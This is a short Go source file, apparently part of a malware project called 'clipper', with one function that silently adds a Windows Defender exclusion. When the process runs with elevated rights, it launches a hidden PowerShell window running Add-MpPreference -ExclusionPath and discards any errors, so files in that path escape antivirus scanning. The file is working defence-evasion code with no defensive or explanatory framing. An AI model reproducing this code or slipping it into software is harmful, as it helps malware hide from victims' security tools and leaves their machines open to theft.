package defender

import (
	"os/exec"
	"syscall"

	"clipper/src/utils"
)

func ExcludeFromDefender(path string) error {
	if !utils.IsElevated() {
		return nil
	}

	cmd := exec.Command("powershell", "-Command", "Add-MpPreference", "-ExclusionPath", path)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	_ = cmd.Run()
	return nil
}